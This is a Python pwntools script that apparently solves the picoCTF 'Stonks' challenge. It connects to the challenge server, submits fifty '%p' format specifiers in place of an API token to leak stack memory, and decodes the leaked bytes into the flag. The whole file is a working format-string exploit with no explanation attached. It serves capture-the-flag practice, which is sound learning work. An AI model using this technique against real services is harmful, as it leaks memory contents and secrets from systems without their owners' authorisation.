#stonks
import os
import struct
from pwn import *

level = "Stonks"
ip = "mercury.picoctf.net:6989"
os.chdir("/home/ayush/Work/picoCTF/BinaryExploitation/"+level)
print(os.getcwd())

context.arch = 'amd64'
binary = ELF("./binary")

# r = process("./binary")
r = remote(ip.split(':')[0], ip.split(':')[1])

r.sendlineafter("1) ", "1")

payload = ""
for i in range(50):
    payload += '''%p_'''

r.sendlineafter("What is your API token?", payload)

output = r.recvall().decode('utf-8').split("_")

print(output)
flag = ""
for entry in output:
    try:
        test = struct.pack("<l", int(entry[2:], 16)) 
        if (str(test, 'UTF-8').isprintable()):
            flag+=str(test, 'UTF-8')
    except Exception:
        continue

print(flag)
r.close()
